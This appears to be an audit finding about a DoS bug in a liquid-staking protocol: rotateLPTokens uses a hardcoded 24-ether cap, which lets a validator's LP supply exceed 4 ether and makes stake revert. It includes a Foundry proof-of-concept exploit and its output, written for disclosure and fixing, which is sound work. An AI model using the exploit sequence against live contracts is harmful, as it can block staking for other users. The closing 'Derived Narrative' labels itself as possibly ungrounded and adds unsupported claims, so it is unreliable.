---
id: 17163
severity: "Medium"
---

# Incorrect implementation of the `ETHPoolLPFactory.sol#rotateLPTokens` let user stakes ETH more than `maxStakingAmountPerValidator` in `StakingFundsVault`, and DOS the stake function in `LiquidStakingManager`

## Description

```solidity
function stake(
    bytes[] calldata _blsPublicKeyOfKnots,
    bytes[] calldata _ciphertexts,
    bytes[] calldata _aesEncryptorKeys,
    IDataStructures.EIP712Signature[] calldata _encryptionSignatures,
    bytes32[] calldata _dataRoots
) external {
```

before the staking, the validation function is called:
```solidity
// check minimum balance of smart wallet, dao staking fund vault and savETH vault
_assertEtherIsReadyForValidatorStaking(blsPubKey);
```

which calls:
```solidity
/// @dev Check the savETH vault, staking funds vault and node runner smart wallet to ensure 32 ether required for staking has been achieved
function _assertEtherIsReadyForValidatorStaking(bytes calldata blsPubKey) internal view {
    address associatedSmartWallet = smartWalletOfKnot[blsPubKey];
    require(associatedSmartWallet.balance >= 4 ether, "Smart wallet balance must be at least 4 ether");

    LPToken stakingFundsLP = stakingFundsVault.lpTokenForKnot(blsPubKey);
    require(address(stakingFundsLP) != address(0), "No funds staked in staking funds vault");
    require(stakingFundsLP.totalSupply() == 4 ether, "DAO staking funds vault balance must be at least 4 ether");

    LPToken savETHVaultLP = savETHVault.lpTokenForKnot(blsPubKey);
    require(address(savETHVaultLP) != address(0), "No funds staked in savETH vault");
    require(savETHVaultLP.totalSupply() == 24 ether, "KNOT must have 24 ETH in savETH vault");
}
```

note that the code requires the total supply of the stakingFundsLP to be equal to 4 ETHER
```solidity
require(stakingFundsLP.totalSupply() == 4 ether, "DAO staking funds vault balance must be at least 4 ether");
```

however, user can call the function rotateLPTokens to mint more than 4 ETHER of the stakingFundsLP because of the incorrect implementation of the ETHPoolLPFactory.sol#rotateLPTokens

note that stakingFundVault inherits from ETHPoolFactory.sol
```solidity
contract StakingFundsVault is
    Initializable, ITransferHookProcessor, StakehouseAPI, ETHPoolLPFactory,
```

so user call rotateLPTokens on StakingFundsVault
```solidity
/// @notice Allow users to rotate the ETH from one LP token to another in the event that the BLS key is never staked
/// @param _oldLPToken Instance of the old LP token (to be burnt)
/// @param _newLPToken Instane of the new LP token (to be minted)
/// @param _amount Amount of LP tokens to be rotated/converted from old to new
function rotateLPTokens(LPToken _oldLPToken, LPToken _newLPToken, uint256 _amount) public {
    require(address(_oldLPToken) != address(0), "Zero address");
    require(address(_newLPToken) != address(0), "Zero address");
    require(_oldLPToken != _newLPToken, "Incorrect rotation to same token");
    require(_amount >= MIN_STAKING_AMOUNT, "Amount cannot be zero");
    require(_amount <= _oldLPToken.balanceOf(msg.sender), "Not enough balance");
    require(_oldLPToken.lastInteractedTimestamp(msg.sender) + 30 minutes < block.timestamp, "Liquidity is still fresh");
    require(_amount + _newLPToken.totalSupply() <= 24 ether, "Not enough mintable tokens");
```

note the line:
```solidity
require(_amount + _newLPToken.totalSupply() <= 24 ether, "Not enough mintable tokens");
```

the correct implementaton should be:
```solidity
require(_amount + _newLPToken.totalSupply() <= maxStakingAmountPerValidator, "Not enough mintable tokens");
```

The 24 ETH is hardcoded, but when the stakingFundsVault.sol is init, the maxStakingAmountPerValidator is set to 4 ETH.
```solidity
/// @dev Initialization logic
function _init(LiquidStakingManager _liquidStakingNetworkManager, LPTokenFactory _lpTokenFactory) internal virtual {
    require(address(_liquidStakingNetworkManager) != address(0), "Zero Address");
    require(address(_lpTokenFactory) != address(0), "Zero Address");

    liquidStakingNetworkManager = _liquidStakingNetworkManager;
    lpTokenFactory = _lpTokenFactory;

    baseLPTokenName = "ETHLPToken_";
    baseLPTokenSymbol = "ETHLP_";
    maxStakingAmountPerValidator = 4 ether;
}
```

note the line:
```solidity
maxStakingAmountPerValidator = 4 ether;
```

this parameter maxStakingAmountPerValidator restrict user’s ETH deposit amount
```solidity
/// @dev Internal business logic for processing staking deposits for single or batch deposits
function _depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount, bool _enableTransferHook) internal {
    require(_amount >= MIN_STAKING_AMOUNT, "Min amount not reached");
    require(_blsPublicKeyOfKnot.length == 48, "Invalid BLS public key");

    // LP token issued for the KNOT
    // will be zero for a new KNOT because the mapping doesn't exist
    LPToken lpToken = lpTokenForKnot[_blsPublicKeyOfKnot];
    if(address(lpToken) != address(0)) {
        // KNOT and it's LP token is already registered
        // mint the respective LP tokens for the user

        // total supply after minting the LP token must not exceed maximum staking amount per validator
        require(lpToken.totalSupply() + _amount <= maxStakingAmountPerValidator, "Amount exceeds the staking limit for the validator");

        // mint LP tokens for the depoistor with 1:1 ratio of LP tokens and ETH supplied
        lpToken.mint(msg.sender, _amount);
        emit LPTokenMinted(_blsPublicKeyOfKnot, address(lpToken), msg.sender, _amount);
    }
    else {
        // check that amount doesn't exceed max staking amount per validator
        require(_amount <= maxStakingAmountPerValidator, "Amount exceeds the staking limit for the validator");
```

note the line:
```solidity
require(_amount <= maxStakingAmountPerValidator, "Amount exceeds the staking limit for the validator"); 
```

However, such restriction when rotating LP is changed to
```solidity
require(_amount + _newLPToken.totalSupply() <= 24 ether, "Not enough mintable tokens");
```

**So to sum it up:**

When user stakes, the code strictly requires the stakingFundVault LP total supply is equal to 4 ETH:
```solidity
require(stakingFundsLP.totalSupply() == 4 ether, "DAO staking funds vault balance must be at least 4 ether");
```

However, when rotating the LP, the maxStakingAmountPerValidator for staking fund LP becomes 24 ETH, which exceeds 4 ETH (the expected maxStakingAmountPerValidator)

## Proof of Concept

First we need to add the import in LiquidStakingManager.t.sol
```solidity
import { MockAccountManager } from "../../contracts/testing/stakehouse/MockAccountManager.sol";

import "../../contracts/liquid-staking/StakingFundsVault.sol";
import "../../contracts/liquid-staking/LPToken.sol";
```

**then we add the POC:**
```solidity
function test_rotateLP_Exceed_maxStakingAmountPerValidator_POC() public {

    address user = vm.addr(21312);

    bytes memory blsPubKeyOne = fromHex("94fdc9a61a34eb6a034e343f20732456443a2ed6668ede04677adc1e15d2a24500a3e05cf7ad3dc3b2f3cc13fdc12af5");
    bytes memory blsPubKeyTwo = fromHex("9AAdc9a61a34eb6a034e343f20732456443a2ed6668ede04677adc1e15d2a24500a3e05cf7ad3dc3b2f3cc13fdc12af5");

    bytes[] memory publicKeys = new bytes[](2);
    publicKeys[0] = blsPubKeyOne;
    publicKeys[1] = blsPubKeyTwo;

    bytes[] memory signature = new bytes[](2);
    signature[0] = "signature";
    signature[1] = "signature";

    // user spends 8 ether and register two keys to become the public operator
    vm.prank(user);
    vm.deal(user, 8 ether);
    manager.registerBLSPublicKeys{value: 8 ether}(
        publicKeys,
        signature,
        user
    );

    // active two keys
    MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyOne, 1);
    MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyTwo, 1);

    // deposit 4 ETH for public key one and public key two
    StakingFundsVault stakingFundsVault = manager.stakingFundsVault();
    stakingFundsVault.depositETHForStaking{value: 4 ether}(blsPubKeyOne, 4 ether);
    stakingFundsVault.depositETHForStaking{value: 4 ether}(blsPubKeyTwo, 4 ether);

    // to bypass the error: "Liquidity is still fresh"
    vm.warp(1 days);

    // rotate staking amount from public key one to public key two
    // LP total supply for public key two exceed 4 ETHER
    LPToken LPTokenForPubKeyOne = manager.stakingFundsVault().lpTokenForKnot(blsPubKeyOne);
    LPToken LPTokenForPubKeyTwo = manager.stakingFundsVault().lpTokenForKnot(blsPubKeyTwo);
    stakingFundsVault.rotateLPTokens(LPTokenForPubKeyOne, LPTokenForPubKeyTwo, 4 ether);

    uint256 totalSupply = LPTokenForPubKeyTwo.totalSupply();
    console.log("total supply of the Staking fund LP exists 4 ETHER.");
    console.log(totalSupply);

    // calling TestUtils.sol#stakeSingleBlsPubKey, revert
    stakeSingleBlsPubKey(blsPubKeyTwo);

}
```

We run the POC:
```bash
forge test -vv --match test_rotateLP_Exceed_maxStakingAmountPerValidator_POC
```

the output is:
```bash
Running 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests
[FAIL. Reason: DAO staking funds vault balance must be at least 4 ether] test_rotateLP_Exceed_maxStakingAmountPerValidator_POC() (gas: 1510454)
Logs:
  total supply of the Staking fund LP exists 4 ETHER.
  8000000000000000000

Test result: FAILED. 0 passed; 1 failed; finished in 15.73ms

Failing tests:
Encountered 1 failing test in test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests
[FAIL. Reason: DAO staking funds vault balance must be at least 4 ether] test_rotateLP_Exceed_maxStakingAmountPerValidator_POC() (gas: 1510454)
```

the total supply of the LP exceeds 4 ETH and the transaction precisely reverts in:
```solidity
require(stakingFundsLP.totalSupply() == 4 ether, "DAO staking funds vault balance must be at least 4 ether");
```

## Recommendation

We recommend the project change from
```solidity
require(_amount + _newLPToken.totalSupply() <= 24 ether, "Not enough mintable tokens");
```

to
```solidity
require(_amount + _newLPToken.totalSupply() <= maxStakingAmountPerValidator, "Not enough mintable tokens");
```

and change from
```solidity
/// @dev Check the savETH vault, staking funds vault and node runner smart wallet to ensure 32 ether required for staking has been achieved
function _assertEtherIsReadyForValidatorStaking(bytes calldata blsPubKey) internal view {
    address associatedSmartWallet = smartWalletOfKnot[blsPubKey];
    require(associatedSmartWallet.balance >= 4 ether, "Smart wallet balance must be at least 4 ether");

    LPToken stakingFundsLP = stakingFundsVault.lpTokenForKnot(blsPubKey);
    require(address(stakingFundsLP) != address(0), "No funds staked in staking funds vault");
    require(stakingFundsLP.totalSupply() >= 4 ether, "DAO staking funds vault balance must be at least 4 ether");

    LPToken savETHVaultLP = savETHVault.lpTokenForKnot(blsPubKey);
    require(address(savETHVaultLP) != address(0), "No funds staked in savETH vault");
    require(savETHVaultLP.totalSupply() >= 24 ether, "KNOT must have 24 ETH in savETH vault");
}
```

we change from `==` balance check to `>=`, because `==` balance check is too strict in this case.

Really nice find and described beautifully. The only thing I would ask is why it is considered a HIGH risk, if the described impact is DOS of the staking function, which is a Medium level impact.

I agree with the sponsor and other wardens here. This should be medium. Great find and explanation.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The contract implements a liquid‑staking workflow where each validator (identified by a BLS public key) must have exactly 4 ether of staking funds represented by a dedicated LP token in the StakingFundsVault. Before a validator can be activated, the internal function _assertEtherIsReadyForValidatorStaking checks that the LP token totalSupply equals 4 ether and that the associated smart‑wallet holds at least 4 ether. This strict equality check is intended to guarantee that no more than the protocol‑defined maxStakingAmountPerValidator (4 ether) is ever assigned to a single validator. However, the public function rotateLPTokens, which allows a user to burn an old LP token and mint a new one, contains a hard‑coded limit of 24 ether when validating the amount that can be minted: require(_amount + _newLPToken.totalSupply() <= 24 ether). Because the protocol’s maxStakingAmountPerValidator is only 4 ether, an attacker can call rotateLPTokens after depositing the allowed 4 ether for two separate validators, then rotate the LP tokens from one validator to the other, inflating the target validator’s LP totalSupply to 8 ether (or any amount up to 24 ether). When the stake function later invokes _assertEtherIsReadyForValidatorStaking, the equality check (stakingFundsLP.totalSupply() == 4 ether) fails, causing the transaction to revert with the message "DAO staking funds vault balance must be at least 4 ether". This denial‑of‑service (DoS) prevents the affected validator from being staked, effectively locking the user’s deposited ETH and preventing reward accrual. The bug is subtle because the rotateLPTokens function appears to enforce a sensible global cap (24 ether) and the equality check is only triggered later in the staking flow, making the inconsistency easy to miss during casual testing. The vulnerability was discovered during a formal audit when a test case deliberately rotated LP tokens beyond the per‑validator limit and observed the revert. The issue affects any participant who relies on the staking function – delegators, node operators, and the protocol itself – as it can halt new validator onboarding and reduce overall network security. To remediate, the rotateLPTokens require statement should reference the configurable maxStakingAmountPerValidator instead of the hard‑coded 24 ether, and the equality check in _assertEtherIsReadyForValidatorStaking should be relaxed to a greater‑than‑or‑equal comparison (>=) to accommodate legitimate scenarios where the LP supply may equal or exceed the limit after legitimate operations. By aligning both checks with the same configurable parameter, the protocol restores its intended accounting guarantees and prevents the LP supply from being artificially inflated, eliminating the DoS vector.
